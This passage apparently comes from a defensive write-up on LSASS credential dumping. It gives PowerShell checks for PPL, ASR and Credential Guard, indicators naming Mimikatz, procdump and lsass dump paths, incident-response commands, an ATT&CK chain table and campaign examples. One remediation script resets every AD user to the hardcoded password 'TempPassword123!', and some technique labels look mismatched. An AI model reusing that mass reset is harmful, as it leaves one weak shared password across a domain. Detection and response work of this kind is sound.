*   **Enable Auditing:** Log all LSASS access attempts.
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
    3. Enable: **Audit Handle Manipulation** (Success + Failure)
    4. Enable: **Audit Kernel Object** (Success + Failure)
    5. Run `gpupdate /force`

#### Validation Command (Verify Fix)

```powershell
# Check if PPL is enabled for LSASS
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue | Select-Object RunAsPPL

# Expected Output (If Secure): RunAsPPL = 1 or 2
# Expected Output (If Not Secure): Property doesn't exist or value is 0

# Check ASR Rules
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids

# Check Credential Guard
$credGuard = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -ErrorAction SilentlyContinue
if ($credGuard -and (Get-ItemProperty -Path $credGuard -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity -eq 1) {
    Write-Host "Credential Guard: ENABLED"
} else {
    Write-Host "Credential Guard: DISABLED"
}
```

**Expected Output (If Secure):**
```
RunAsPPL                              : 1
AttackSurfaceReductionRules_Ids       : {26190899-1602-49e8-8b27-eb1d0a1ce869, 9e6c4e1f-7d60-472f-ba1a-a39dc776e697, ...}
Credential Guard: ENABLED
```

**What to Look For:**
- RunAsPPL = 1 (or 2 on Server 2022+) = Protected
- ASR rules list contains credential/process injection rules
- Credential Guard enabled if hardware supports

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - C:\Windows\Temp\lsass*.dmp
    - C:\Windows\CrashDumps\lsass*.dmp
    - C:\Temp\lsass.dmp
    - Any .dmp file created in uncommon paths
    - Mimikatz.exe, procdump64.exe on non-admin machines

*   **Registry:**
    - HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 0 (disabled)
    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe\GlobalFlag = 0x200 (suspicious WER config)

*   **Network:**
    - Outbound HTTPS/HTTP to unknown domains from System process
    - SMB traffic to external shares from SYSTEM account
    - Unencrypted credential transmission

#### Forensic Artifacts

*   **Disk:**
    - Dump files: C:\Windows\Temp\*, C:\Temp\*, C:\Windows\CrashDumps\*
    - Event logs: C:\Windows\System32\winevt\Logs\Security.evtx
    - Sysmon logs: C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon~Operational.evtx

*   **Memory:**
    - Lsass.exe process memory contains plaintext passwords, NTLM hashes, Kerberos tickets
    - Evidence of handle opening with suspicious access masks (0x1010, 0x1040)

*   **Cloud (M365/Entra ID):**
    - SigninLogs showing authentication after credential theft (impossible travel, new locations)
    - AuditLogs showing unusual admin activity (role assignments, policy changes) by compromised accounts

*   **MFT/USN Journal:**
    - MFT entry for dump file creation with timestamp
    - $UsnJrnl showing creation of lsass.dmp or similar files

#### Response Procedures

1.  **Isolate (IMMEDIATE):**
    
    **Command (Disconnect Network):**
    ```powershell
    # Disable all network adapters
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```
    
    **Manual (Azure):**
    - Navigate to **Azure Portal** → **Virtual Machines** → Select affected VM → **Networking** → **Disconnect** from all subnets

2.  **Collect Evidence:**
    
    **Command (Export Security Event Log):**
    ```powershell
    # Export last 24 hours of Security logs
    $yesterday = (Get-Date).AddDays(-1)
    wevtutil epl Security C:\Evidence\Security.evtx /overwrite
    Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$yesterday} | Export-Csv -Path C:\Evidence\Security_Events.csv -NoTypeInformation
    ```
    
    **Command (Capture Memory Dump of Affected Machine):**
    ```powershell
    # If still running, dump entire system memory (requires DumpIt.exe or WinDBG)
    # Note: This is resource-intensive; only if no other forensics available
    ```
    
    **Manual:**
    - Open **Event Viewer** → **Windows Logs** → **Security** → Right-click → **Save All Events As** → `C:\Evidence\Security.evtx`
    - Copy **C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon~Operational.evtx** to evidence folder
    - Export Sysmon logs: `wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx`

3.  **Remediate:**
    
    **Command (Kill Malicious Processes):**
    ```powershell
    # Stop any suspicious processes (if still running)
    Stop-Process -Name "mimikatz", "procdump", "rundll32" -Force -ErrorAction SilentlyContinue
    ```
    
    **Command (Remove Dump Files):**
    ```powershell
    # Delete dump files
    Remove-Item "C:\Windows\Temp\lsass*.dmp" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Temp\lsass*.dmp" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\CrashDumps\lsass*.dmp" -Force -ErrorAction SilentlyContinue
    ```
    
    **Command (Password Reset ALL Affected Users):**
    ```powershell
    # Reset all user passwords in AD
    # In Entra ID:
    $affectedUsers = @("user1@contoso.com", "user2@contoso.com", "admin@contoso.com")
    foreach ($user in $affectedUsers) {
        # Password reset must be done via Azure Portal or Set-AzureADUserPassword
        Update-MgUser -UserId $user -PasswordProfile @{ForceChangePasswordNextSignIn=$true}
    }
    
    # In On-Premises AD:
    $affectedUsers = Get-ADUser -Filter {Name -like "*"}
    foreach ($user in $affectedUsers) {
        Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force)
        Set-ADUser -Identity $user -ChangePasswordAtLogon $true
    }
    ```

4.  **Hunt for Lateral Movement:**
    
    **Command (Find Unusual RDP Logons):**
    ```powershell
    # Check for lateral movement via RDP
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; StartTime=(Get-Date).AddDays(-1)} |
      Where-Object {$_.Properties[8].Value -eq 10} | # RDP logon type
      Export-Csv -Path C:\Evidence\RDP_Logons.csv
    ```
    
    **Command (Check for Kerberos Ticket Abuse):**
    ```powershell
    # Check for unusual TGS-REQ events (possible Golden Ticket)
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddDays(-1)} |
      Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}, @{N='Service';E={$_.Properties[2].Value}} |
      Export-Csv -Path C:\Evidence\Kerberos_Tickets.csv
    ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing: Spearphishing Attachment | Attacker sends malicious document or link to gain foothold |
| **2** | **Execution** | [T1204.002] User Execution: Malicious File | User executes payload; malware installed |
| **3** | **Persistence** | [T1547.001] Boot or Logon Autostart Execution | Malware achieves persistence via Registry RunKeys |
| **4** | **Privilege Escalation** | [T1548.002] Abuse Elevation Control Mechanism | Attacker exploits UAC bypass or Windows vulnerability to elevate to admin |
| **5** | **Credential Access** | **[PERSIST-INJECT-001] LSASS Credential Injection** | **Attacker dumps LSASS memory to harvest credentials** |
| **6** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Attacker uses stolen credentials to move to Domain Controller or admin workstation |
| **7** | **Impact** | [T1565.001] Data Destruction: Stored Data Manipulation | Attacker executes ransomware or data exfiltration with harvested credentials |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: LAPSUS$ Credential Theft Campaign (2022)

- **Target:** Software development, cloud infrastructure companies (Microsoft, Okta, Cisco)
- **Timeline:** February - March 2022
- **Technique Status:** LSASS dumping used after initial access to harvest domain admin credentials
- **Impact:** Complete domain compromise; ability to access source code repositories, cloud infrastructure
- **Reference:** [Microsoft Security Blog: LAPSUS$ Attack](https://www.microsoft.com/en-us/security/blog/2022/03/22/emerging-threats-lapsus-and-aurora-solaris-ransomware-campaigns/)

#### Example 2: Conti Ransomware Operational Security (2021-2022)

- **Target:** Fortune 500 companies in healthcare, manufacturing, finance
- **Timeline:** Ongoing 2021 - 2022 takedown
- **Technique Status:** Conti used Mimikatz extensively post-compromise to dump LSASS and harvest admin credentials for lateral movement
- **Impact:** Lateral movement to Domain Controller; encrypted entire networks; demanded multi-million dollar ransoms
- **Reference:** [CISA Alert: Conti Ransomware](https://www.cisa.gov/news-events/alerts/2022/09/29/cisa-releases-conti-ransomware-decryptor)

#### Example 3: Scattered Spider Incident Response Evasion (2023)

- **Target:** Major financial services and technology organizations
- **Timeline:** 2023 campaign detected in incident response
- **Technique Status:** Scattered Spider used LSASS memory dumps to extract admin credentials, then used those creds to modify incident response tools and logs
- **Impact:** Ability to modify/delete audit logs; evaded detection for 3+ weeks; exfiltrated sensitive data
- **Reference:** [Red Canary: Scattered Spider Analysis](https://redcanary.com/blog/scattered-spider/)

---

## Appendix: References & Sources

1. [MITRE ATT&CK T1055.001 - Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)
2. [MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
3. [Microsoft Learn - Detecting and Preventing LSASS Credential Dumping](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/)
4. [Red Canary - Process Injection Detection](https://redcanary.com/threat-detection-report/techniques/process-injection/)
5. [Atomic Red Team - LSASS Dumping Tests](https://github.com/redcanaryco/atomic-red-team)
6. [Splunk - LSASS Access Hunting](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)
7. [Microsoft Defender for Endpoint - Attack Surface Reduction](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference)
8. [Purple Team - LSASS Dump via Windows Error Reporting](https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/)
9. [CyberAdvisors - Dumping LSASS Without Mimikatz](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)
10. [Detection.FYI - LSASS Credential Dumping Detection Methods](https://detection.fyi/tags/attack.t1003.001/)

---
